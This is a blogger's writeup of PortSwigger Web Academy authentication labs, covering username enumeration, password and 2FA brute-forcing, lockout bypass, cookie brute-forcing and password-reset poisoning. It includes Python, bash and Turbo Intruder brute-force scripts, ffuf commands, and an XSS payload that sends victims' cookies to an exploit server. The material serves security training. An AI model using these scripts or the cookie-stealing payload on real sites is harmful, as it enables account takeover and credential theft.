---
title: Broken Authentication
author:
  name: kill5witch
  link: https://github.com/an9k0r
date: 2022-09-30 09:00:00 +0200
categories: [Notes, Web Application]
tags: [Notes, Web Application, Portswigger]
math: true
mermaid: true
image:
  src: /assets/images/
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
This post/writeup is all about the Authentication vulnerabilities or [Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication), if we follow [OWASP](https://owasp.org/) naming scheme. 

I'll be using [Portswigger Web Academy](https://portswigger.net/web-security/authentication) Labs, but i do intent do throw other labs and writeups here as well.

Labs are structured as following:
- Password-based login
  - Username enumeration via different responses
  - Username enumeration via subtly different responses
  - Username enumeration via response timing

- Multi-factor authentication
- Alternative authentication mechanisms
  - Password reset

# Theory
For successful authentication (considering we're not dealing with MFA) we need an username and password. Password usually has to be guessed or brute-forced however username may sometimes be enumerated as well. This may be possible while observing:
- Status Codes
- Error Messages (in response)
- Response Times (if application does SQL check for username and password sequentially)

# Username & Password based login
## Username enumeration via different responses
>  This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
> [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
> [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
> To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 

### Enumeration
We can see the webpage's login:

![picture 36](/assets/images/ed2f89dc6333ed3651c8eb143bfd3954de6481c51d031d9a0b862b84ff01f34b.png)  

Application throws an error `Invalid Username`

![picture 37](/assets/images/9daa12d3a39445aa7ba18da99863ba8859c53432e9efcdcd51f0f4e0f680dafa.png) 

### Username Bruteforcing with Burp Intruder

Let's paste the [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames) into Burp's Intruder:

![picture 38](/assets/images/382a7965940c694ae036d8756a11c5ed811625c734dd9bb4073dd321273a7acd.png)  

We've found the user, which is `user`.

Let's bruteforce the password with `ffuf`

### Password Bruteforcing with `ffuf`

```
ffuf -w portswigger_passwords:FUZZ_PASS  -u "https://0a3e005e03bf0fbac09413a80059004c.web-security-academy.net/login" -d "username=user&password=FUZZ_PASS" --fs 3098
```
Mind that `--fs 3098` was added to filter out the requests which return `invalid password`. They all have same response size.

![picture 39](/assets/images/1ab428ec4afd128fb3d2f93b99253feec82e9309519d37a52f2a47a96945c8af.png)  

Both, username and password have been retrieved. Labb has been solved.

![picture 40](/assets/images/7194fc218858874f87532878610aedcf526d9201fbbaedf1f1d8fa0c989f954b.png)  

## Username enumeration via subtly different responses
>  This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
> [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
> [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
> To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 

This lab can be bruteforced with just trying every username or password, however we're supposed to pay attention to *subtly different responses*. 

### Username brute-force using Intruder and Grep - Extract

Let's add `Grep - Export`.

![picture 41](/assets/images/38a2296e2b8ae3a5bd003c4370e580f930f442052009d09b8c7a1213f555b5ad.png)  

As soon as we highlight `Invalid username or password`, parameters will be set automaticaly. Just apply that, set the same username list from portswigger and run the Intruder:

![picture 42](/assets/images/b8180aaebe060ecf4679ecff59891f5b987be0a49710e9b0ef889fffb2634cc1.png)  

One request is slightly different - Username: `alerts`

### Password brute-force using Intruder and Grep - Extract

Let's do the same with the password. Remember to change the password list! `Grep - Extract` can stay the same.

We can notice that `11111111` gave us different response and `HTTP 302`:

![picture 43](/assets/images/568169da8f9339df262cf52ec643d638244ec894e01cffd0f52596fcb0ebb66f.png)  

Lab has been solved

![picture 44](/assets/images/e050b3ff501b65d6c47de9a91aae6173e910402fb5fd3f0101e2a578fc0b3193.png)  

## Username enumeration via response timing

>  This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
> Your credentials: wiener:peter 

Here we've got an account, so we can measure how long does a query need for existing account and for a non-existing.

### Measuring response for existing and non-existing accounts with Burp Repeater

![picture 45](/assets/images/155b764d0fb1664b18b077b515ad727d790405d92ed8de4ba11944d60fe97da1.png)  

We have around 10ms difference. Let's try with the wordlist but watchout:

> Error: You have made too many incorrect login attempts. Please try again in 30 minute(s).

We have to take care of the IP-Block, which we can bypass using `X-Forwarded-For` header. We'd use Pitchfork mode for that, so IP and Username change with every cycle!

![picture 46](/assets/images/81dcfd04785dc9a823502064a558cee19c48cac14619b999d0fcd4649ee9b72f.png)  

We can see that with `access` the difference is even greater, we should however always double-check! ;)

![picture 47](/assets/images/a45d8532d5384070977c8818409162e684cc27e7bb4604091895a0b677c4da0e.png)  

### Brute-Force password
Assuming the username really is `access` let's brute-force password.

Again with using Pitchfork mode and cycling the IPs in `X-Forwarded-For`

![picture 48](/assets/images/70a35935599abac6fc995cce1013edb69a24815c6b5a4bed49d76cf6cbdcadd9.png)  

So there it is, a `sunshine` ;).

This is the problem that i've had. I'll just intercept the request and add some random IP when authenticating as `access:sunshine`

![picture 49](/assets/images/f2f0441040ae46f29db85fd9c8b341040ffd1c97b6ebf5e13181b304d4cdc946.png)  

Lab has been solved:

![picture 50](/assets/images/3b78819400a62f687f5fd54f6dea6185a194096bf619265884c8ecb0364949b2.png)  

## Broken brute-force protection, IP block

>  This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.
> Your credentials: wiener:peter
> 
> Victim's username: carlos
> 
> [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

### Intro
This would be the second Lab now where we have to bypass the IP block for brute-forcing. Let us get to it. We have a victim `carlos` and we have working credentials

### Trying simple password brute-force

On the 4th try we get a message that we have to wait a minute before trying again.

![picture 51](/assets/images/7885742dfdf2b33bb7adcc14f9410e144003c2e2232636b9b2f9ce82ed6db6a3.png)  

Spoiler Alert: `X-Forwarded-For` does not help here.

What however works is:
- 1st request = Brute-force password for `carlos`
- 2nd request = Brute-force password for `carlos`
- 3rd request = Login with `wiener:peter` which resets the counter
- ...repeat

My ideas here were create a wordlist for username and password where at every 3rd try is come `wiener:peter` credentials. 

### Solution #1 - Brute-force using python requests
In python this is relatively easily scriptable by using 2 for loop cycles.

```py
import requests
import sys

requests.urllib3.disable_warnings()

def bruteforce(target, cycles, password_list, username, working_credz):
    for password in password_list:
        if ":" in password:
            credentials_split = password.split(":")
            password = credentials_split[1]
            username = credentials_split[0]
        else:
            username=username
            password=password
        session = requests.Session()
        session.verify = False
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {"username":username, "password":password} 
        s = requests.post(target, data=data, headers=headers)
        if username not in working_credz:
            print("(+) tried %s:%s; Content-Length: %s" %(username,password,s.headers['Content-length']))
            #print(s.headers)
            #print(r.text)
    return 0

def main():
    if len(sys.argv) != 6:
        print("(!) usage: %s <target> <wordlist> <cycles> <working_credentials> <username>" % sys.argv[0])
        print("(!) eg: %s https://target.tld/login ./passwords 2 'user:pass' username" % sys.argv[0])
        sys.exit(-1)
    
    target = str(sys.argv[1])
    wordlist = str(sys.argv[2])
    cycles = int(sys.argv[3])
    working_credz = str(sys.argv[4])
    username = str(sys.argv[5])
    
    print("(+) Target: %s; Wordlist: %s; Cycles before using working credentials: %s; Working Credentials: '%s'; Bruteforcing user: %s" % (target,wordlist,cycles,working_credz,username))

    with open(wordlist) as f:
        passwords = [line.rstrip() for line in f]
        # List needs to be initialy set and should be reset every 3rd turn, but this will be done in for loop
        password_list=[]
        for password in passwords:
            password_list.append(password)
            if len(password_list) == 2:
                password_list.append(working_credz)
                #print("(+) Batch: %s" %(password_list))
                bruteforce_session = bruteforce(target, cycles, password_list, username, working_credz)
                password_list=[]
            else:
                continue
        print("\n(+) All passwords have been checked!")
if __name__ == "__main__":
    main()

```

![picture 54](/assets/images/670231072304ac87bf065668c71435e44d56ece1985dd8fb21b11e3739401aa5.png)

Lab has been solved:

![picture 53](/assets/images/55679382b3b1fb820555fa5f9ffddc91fa4a4e26a90ccd78eb281f05265b7ee3.png)  

### Solution #2 - Using Burp Intruder with customized username and password lists.
This may be easier and faster as we only need to modify scripts in a ways that `wiener:peter` appear after 2nd brute-force attempt. Something like
- carlos:123456
- carlos:123457
- wiener:peter
- carlos:234567
- carlos:234568
- wiener:peter
- etc.

This can be also done using python or bash, by reading file line by line and injecting on 3rd iteration. Mind that in the IF statement, we either output `carlos` or the actual entry in the username/password table.

```bash
#!/bin/bash
# there are no built in checks. Run as following:
# ./custom_wordlist_inject.sh ./portswigger_usernames wiener 3
# ./custom_wordlist_inject.sh <wordlist> <either pass or username that we want to inject> <declare on how many cycles injected string should appear>
bruteforce_list=$1
injection_on=$2
declare -i cycles=$3
declare -i i=0

while read -r line
do 
    i=$i+1
    if (($i<$cycles))
    then
        #for usernames only carlos should show as this is the user that is being brute-forced!. Reading the wordlist isn't really necessary for usernames but i'll let it be. Either commend out this line:
        echo $line
        # or this line
        #echo "carlos"
    else
        echo $injection_on
        i=0
    fi
done < $bruteforce_list
```

Result:
![picture 57](/assets/images/158653a7fb3fd1b344f6378e25048e77d2907f6c274c12c4692273b51d44d278.png)  

We can see that on every 3rd iteration, login should theoreticaly succed. Script above can be piped into file to save it on disk!.

We can throw both lists to Burp Intruder now and use `Pitchfork` mode.

![picture 59](/assets/images/7d83d48a648ad4651dc376f269701cd5b0c4f111299b0f0d3b19ff69e0f58403.png)

Modify the `Resource pool` to `1` or we'll get blocked

![picture 58](/assets/images/fded7ad2c7d58557b1dfe686dd27dcbfbf0d5b5df31fc3c339ce9af0376a202b.png)  

... and bruteforce

![picture 60](/assets/images/be31b3c5b863c343292a36f9c4ab0ea515e8b867db819c0490310794b2541cab.png)  

We've got the password = `mom`. (yes password changes everytime the lab restarts ;)).

### Solution #3 - Brute-force using Burp Turbo Intruder
Simple Burp's Intruder does not have any scripting possiblilties, but Burp's Turbo Intruder does. After installing and enabling it, we just need to select our POST request and choose Turbo Intruder through right mouse click and going into Extensions.

This is how i've set it up:

![picture 62](/assets/images/4de9f48c1e3af5f1cef9905a2238155d1b94cb4cf946836032af39cc35d7e4ab.png)  

Script:
```py
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    i = 0
    for word in open('/Users/lukaosojnik/Downloads/pw'):
        i = i + 1
        if i < 2:
            # do one free run
            engine.queue(target.req, ["carlos", word.rstrip()])
        elif i == 2:
            # do one extra run and reset with valid credentials
            engine.queue(target.req, ["carlos", word.rstrip()])
            engine.queue(target.req, ["wiener", "peter"])
            i = 0
        else:
            break

def handleResponse(req, interesting):
    if interesting:
        table.add(req)

```

![picture 61](/assets/images/23550081d9a1cd3eafa016c52dd8595290be31b8b3c21799be6917fd3bf0f408.png)  

It would also be possible to use `@MatchStatus(302)`, which would only display responses with status code 302.

Reference: https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack

## Username enumeration via account lock

This lab was done by `ffuf`. I used `head -n 10` command on the password list to make a list with 10 passwords. This list was looped through all usernames. 

![picture 63](/assets/images/6c5267a4484d16fde7b28f4354d2bf081814d8f0a84d8b371afc0197a17645b3.png)  

User `adam` stood out, so it was brute-forced again using whole password list.

```sh
ffuf -w portswigger_passwords:FUZZ_PW -H "Content-Type: application/x-www-form-urlencoded" -u "https://0a58009d041cd3f7c0ae1c7f007000a9.web-security-academy.net/login" -d "username=adam&password=FUZZ_PW" --fs 3049 --fs 3101 -x http://127.0.0.1:8080
```
Obviously there is a difference if password maches. Below the comparisson using Burp Comparer:

![picture 65](/assets/images/2fcc656d531f93859dab30119e5a74cc6a6b7943e6b2472d73839d728faf56f0.png)  

Most probable password `dragon` has been found and Lab has been solved

![picture 64](/assets/images/e83a27806f27f6161c2884b62bd03b08a9c8832a28409b7040f067bb1b981a8b.png)  


## Broken brute-force protection, multiple credentials per request

>  This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page
> Victim's username: carlos
> Candidate passwords

If web applications login mechanismus is broken and lets you authenticate using multiple passwords as one then that's definately a security issue. This is exactle what the application in the lab is doing. Let's check it out.

![picture 66](/assets/images/a837169de77e63c94acd86b5ad3edb04189918189b5e78ce6797da39fc80ed58.png)  

When testing login, we can notice that now we're dealing with JSON. Let's try to include multiple passwords in the same Repeater request.

![picture 67](/assets/images/97b41704edd0e4422296190b1128c31ec47e4f91ae519f09321321e3e499b8e9.png)  

Apparently we've succeded but we don't know what the password is, but if we open the session in browser we see that we've succesfully finished the lab and that we're login.

![picture 68](/assets/images/76d301a8d16302697566158223b3d6702286aaf87c5aa928e76f2b86479f3f97.png)  

# Vulnerabilities in multi-factor authentication
2FA (two-factor authentication) is based on something you know and something you have and should be implemented in a way so they check the same factor in two/more diferent ways. 

## 2FA simple bypass
>  This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.
> 
> Your credentials: wiener:peter
> Victim's credentials carlos:montoya

### Bypassing the 2FA through bad auth. implementation
If we login as `wiener:peter` we recieve an Email.

![picture 69](/assets/images/83e8cc75fdd38530bc6220d81ca82d4502e57263704dbd5b815cea0e503a82c5.png)

If we enter the 4-digit code, we'd get to `my-account` page. 

Problem with this applications authentication implementation is that when we've entered the `username:password` we're already logged in thus skipping the 2FA is entirely possible.

If we enter `carlos:montoya` we'd get asked for 4-digit code BUT if we then just go to `/my-account` we would have bypassed that step. 

If we do just that as described, we'd solve the lab!

![picture 70](/assets/images/090cef16d4e8e0289ea12e63fbfacf7691decea4901aadff14fea1d4110da625.png)

## 2FA broken logic
>  This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.
> 
> Your credentials: wiener:peter
> Victim's username: carlos
> 
> You also have access to the email server to receive your 2FA verification code. 

### Vulnerable 2FA broken logic Enumeration
Let's first login using known working credentials `wiener:peter`. 

After entering credentials we have to enter 4-digit code which we can retrieve from `Email client` with a message like `Hello! Your security code is 1731.`.

Let's inspect both requests now in Burp.

#### 1st Request to /login

![picture 73](/assets/images/36ffc8526e65323b4d96cfc5a0cbab71d7c6959c04e1ef0a459dc9442c92217d.png)  

#### 2nd Request to /login2

![picture 71](/assets/images/71a95be8fd95228572c5dcfd0649a92eb19fb3d7ab963d94102d048e05ca21b1.png)

There is an unusual cookie `verify=wiener`. 

If we send GET request to `login2` to Burp Repeater. Now few Questions arise:
- Can we simply ask for 2FA token? We should recieve a new code if we use repeater
- Can we also do it for `carlos`? We shouldn't recieve any new code when we use repeater => GET Request to `/login2`
- Can we bruteforce the code? Will we be redirected to `carlos`'s `my-account` or back to login or will we see any errors?

### Vulnerable 2FA broken logic Exploitation

Let's ask for token for `carlos`.

![picture 74](/assets/images/2389d3c2ee13504ae4ae1f0b2088485461c5638df7b34d1252d2bf9b9804b26c.png)  

Send to `Turbo Intruder`:

![picture 75](/assets/images/b98c25a4111bf2de1e2a9b7a1641c89d53fa51f203d56a42e6a797c6b13a4ebe.png)  

We know that we need 302 as result, considering how application reacts on correct MFA-code.

![picture 77](/assets/images/71ba946c41827d30d6a46dd96fe963e87bdd6eec0a93570c513ce59ac792d5b6.png)

Code used in Turbo Intruder. Only digits to 3000 will be used, but it could've been set to 9999
```py
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=4,
                           pipeline=False
                           )
    for i in range(3000):
        engine.queue(target.req, '{:d}'.format(i).zfill(4))
        

@MatchStatus(302)
def handleResponse(req, interesting):
    if interesting:
        table.add(req)

```

There was a hit in ca 45 seconds.

![picture 78](/assets/images/3c4d9a2fbc206864cf866d282545fc0862c4a4a9897ee1d180d9daf00ee2326f.png)  

Code was 0810.

If i open same request in the Browser, we're logged in as Carlos

![picture 79](/assets/images/0e57204b9fef5eb4a3d56138c3f16b1f408a6d90cddae0fd25a5f7deffd5cc7b.png)  

## 2FA bypass using a brute-force attack
>  This lab's two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page.
> 
> Victim's credentials: carlos:montoya 

### 2FA Enumeration
Since 2FA mechanismus is pretty much the same as in the previous 2 exercises i'll just describe what happens:
1. POST Request to `login` with username and password
2. We land on `login2` where we have to enter 4-digit token.

![picture 80](/assets/images/618dae7efe87bd4dac2a4ac813f296f8531180a0ee88b5b5c5a151544a932ebc.png)  

Now if there is no Brute-force defense mechanismus on 4-digit PIN we will be able to brute-force it, however we need to bypass CSRF Token as well. After 2 retries we'll be sent back to `login` where we need to enter password again.

![picture 81](/assets/images/26f07ba2892357b351070b45d7353f0a028a97e8fe92859e13800c15638b82e7.png)  

In order bypass CSRF and auto-logout we need to automate the following:
1. Get Request to `/login`. Capture the CSRF here
2. POST Request to `/login`
3. GET /login2
4. POST `/login2` with CSRF.

![picture 82](/assets/images/e3a7ecadcebb7d311efda30c7f2f3855c32bc107caac384de0e7a90faf1dc5c7.png)  

### 2FA Exploitation

We can use Project Sessions with Macro that would help us retrieve new CSRF token. As already mentioned, this would be the requests that we need:

![picture 83](/assets/images/1910a427c191bc481c3e20553845340ff7bf951155cd670cee54dafaec27ee39.png)  

If we do a test run, we can see that we're asked for 4-digit code and CSRF token seems to be present as hidden field.

![picture 84](/assets/images/a6e26b55747e0c0c9a820b476b74f3066d2fac2d6bb6678bb13376f15bc45d8f.png)  

Macro has now been set up:

![picture 85](/assets/images/c0a21a30cac15f7b9d9eeae521671f5a84c75b33eec9ab140ad64bc39f4f0285.png)  

Rule Settings were changed as i'll be using Target Scope AND `Extender` for `Turbo Intruder`
![picture 86](/assets/images/7ff0d458a85b4b2df30b69e38e4b8554cf52ab9ec77ba2e774d2863ad47f1457.png)  

Now if we start Intruder, CSRF token should get changed automatically so We don't need to worry about CSRF and/or do anything with it.

![picture 88](/assets/images/76abb3871cda02594cf7d44a1df2992c649ed9109411c7e5e33bd3b3ca630d21.png)  

Payload was set as following using `Numbers`:

![picture 89](/assets/images/e3a0bac8dc7824c0a077fe4a277525c35b7422dfa7d47a9ba72659bf50a811ab.png)  

Remember, we would see HTTP Error 400 if CSRF token would not match, so brute-force works!

![picture 87](/assets/images/878817350a3ab6a03b18bf6cbd9215af13697c33ec19d147fecced9454531e59.png)  

This would also work with `Turbo Intruder`. I've changed script as following:

```py
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           #pipeline=False,
                           engine=Engine.BURP
                           )
    for i in range(9999):
        engine.queue(target.req, '{:d}'.format(i).zfill(4))
        

@MatchStatus(302)
def handleResponse(req, interesting):
    if interesting:
        table.add(req)

```

There's a PIN

![picture 90](/assets/images/21bc0d3a8ee36cb7aedf435d9ca04973da6b2b07e5158f414076a0c8e554af70.png)

I haven't thought of that, but attack should've been stopped as soon as `HTTP 302` was returned.

Anyways, the lab has been solved!

![picture 91](/assets/images/d0d86b459012cc3e0d2e1dc25c7a0e2c2541ada7828b2391c9b986b21369bb61.png)  

# Other vulnerable Authentication Mechanisms
## Brute-forcing a stay-logged-in cookie
>  This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.
> 
> To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.
> 
> Your credentials: wiener:peter
> Victim's username: carlos
> [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

Long story short. This is all about the vulnerable `remember me`/`stay-logged-in`functionality.

### Abusing `stay-logged-in` mechanismus

Let's login using `wiener:peter`. 
![picture 92](/assets/images/c3de592df71ec6ed1862aa69f7db5e40afa8f8632db991b0ab92b43699ac07ce.png)

We can see in the response that cookie that is being sent in response includes username and some sort of hash. This md5 hash is password, which is known = `peter`.

This hash persists then in the subsequent requests like `/my-account`. Let's try to bruteforce carlos's password hash in the cookie.

We can use `sniper` mode against `my-account` without session cookie!

For payload we can use the provied password list, we however need do hash he password, add a prefix which is `carlos:` and encode whole thing as base64

![picture 95](/assets/images/5fafc845a3952d4ab27db939c06e0f167ab844f55781c2e1545eb953c9583b29.png)

If everything has been done correctly, Intruder should be able to find the password:

![picture 93](/assets/images/06bf5917d5f0ee71864440174505b15eea3137634a27583c9eb5c91c01e1ed1b.png)  

Lab has been solved

![picture 94](/assets/images/1d7afa7f9c9e75d2410df73c7d5c74d9081b432db69be192ba0a86d089765d64.png)  

## Offline password cracking

> This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.
> 
> Your credentials: wiener:peter
> Victim's username: carlos
> 
> **Learning path**
> 
> !!!!!If you're following our suggested learning path, please note that this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.!!!!!!

### Enumeration first!

Let's login first
![picture 96](/assets/images/4018c68cd599f0f02b42e929a4bba0f73997c1ad0cef417ec395532dba4ab52a.png)  

We're supposed to delete an accout: 
![picture 97](/assets/images/b2fd12ac206bd0a8b983f0bcf5e3ae576d65ebef900d31b69464742355857f93.png)  

If XSS should do cause a deletion, then we'd need a client to request for `/my-account/delete`

We however need to steal the credentials.

### Exploitation next!
For XSS we have a server available:

![picture 98](/assets/images/76f9d6ddf1433f39a0467b27481e77cc5bba2a41619d42e9ead85f8519cd8341.png)  

As we already know that there is a XSS, let's simply leave a message in the comment in one of the posts

![picture 99](/assets/images/6975072d1a762add5aac6bb5df61a0bd29bf82bee7beaed27c37f8d17f1ad285.png)  

Payload:
```
<script>document.location='https://exploit-0a79008a03044c6dc0753916018d0031.web-security-academy.net/c='+document.cookie</script>
```

If we check our Access logs we'd see something there:

![picture 100](/assets/images/c03375535b5c517ff1221cdb1ccd00553065a6d9c5588b4dda34eee461f55a1b.png)  

If we check the `stay-logged-in` token and send it to `Decoder` we can see it's carlos's token:

![picture 101](/assets/images/8ee439d90eaa64cebed1623dd07ae4176ab41657efdc6a7ca1adfccaed54aa25.png)  

Password can be found on google ==> `26323c16d5f4dabff3bb136f2460a943:onceuponatime` for carlos's user.

Now login and delete the Carlos!

![picture 102](/assets/images/c1f0d215900c190e28e00f0b6550e825f69d683aeebea575964f6db7585d7eee.png)  

It would be possible to delete Carlos using XSS, but it was not in focus in this lab!

## Password reset broken logic
>  This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.
> 
> Your credentials: wiener:peter
> 
> Victim's username: carlos

### Enumerating Password Reset mechanismus

First of all let's just reset password for `wiener`. For this we need an email address which is provided by the Lab

![picture 103](/assets/images/74cc1fff4d9689df248918f0a168532fa53b4a418173f7f053fa81b6a7b3fbb6.png)  

In `password-reset` we can either enter username or email. Let's go for an username:

![picture 104](/assets/images/9e8794ce13750b39f41d1b8e50f707dd0baafcd67ac40a04689280571b0893f9.png)  

Email comes with a reset link:

```
https://0ac0003d04636429c0420e00000f00c7.web-security-academy.net/forgot-password?temp-forgot-password-token=6MusLEc8VCPVmUsE3mEMxZ3dRDm9q4VL
```

If i ask for another `password-reset` token, it changes

```
https://0ac0003d04636429c0420e00000f00c7.web-security-academy.net/forgot-password?temp-forgot-password-token=FcIwW5uTrJCBE9IUbYymI84dYN3SeOsN
```

If we click on it, we get to the page to enter a new password.

If we enter a new password, this is a request that is issued to a backend

![picture 105](/assets/images/549e5a26b2babca18b0850fbc62a80cba1a6d6817b047191d3c6e17614c52ab3.png)  

The question now arises, can we swap the username with `carlos` using token that was issued for `wiener`?

### Exploiting Password Reset Mechanismus

If we simply reuse the previous token that was sent to `wiener` and swap the user with `carlos`, it appears that it's actually working

![picture 106](/assets/images/d6db66f52317a07f5f2e7217995cc09f8489d86f2067157d2f2c379a42f45a47.png)

We can login now with `carlos:peter`

![picture 107](/assets/images/970b338af0d5eb1d11f08d5486f6e76608fdbe5a5ba49e535e9224c092fabf62.png)  

Token should only be used once and by any means, it should not work for other users that have not requested it.

## Password reset poisoning via middleware
> This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server. 

### Finding and exploiting the vulnerability

If we ask for password we get same looking link as in previous lab:

```
https://0adc000d03b93ab9c019658300c800ce.web-security-academy.net/forgot-password?temp-forgot-password-token=Jdno4Z4KTNZHn7cLI1nHytyLFtrGp2Ha
```
And request does not ask us for a username

![picture 108](/assets/images/8621fadbfe0dc621aa9dd3c1451e58d0e67f938b0bdf24bf8e40372a72a13084.png)  

Problem here is actually in middleware and this lab is all about that. If we enter `X-Forwarded-Host` header, the link sent will actually get tampered with and swapped with our own host. Let's verify that:

![picture 109](/assets/images/590e488b52c95c653c786e55a3831a465f109fa75852efd38ecfba557014879d.png)  

And checking the access log on our exploit server, we can see that request is there:

![picture 110](/assets/images/590e488b52c95c653c786e55a3831a465f109fa75852efd38ecfba557014879d.png)

We can change the password if we follow the link

![picture 112](/assets/images/7aadb50e4503d024fe045e1ecec1014cfba1ff7f508c4da37486fa02c409889e.png)  

... and login using same password:

![picture 113](/assets/images/408846fc4e5a6ca8cf2ef6631b417cd3188d859571f38a638f3b3d97802d8e63.png)

More on that topic can be found at [Portswigger Reset Password](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning). It all comes down, how the web application crates the token and what its security measures are. As always, it's always dangerous to use user generated input.

## Password brute-force via password change

... to be continued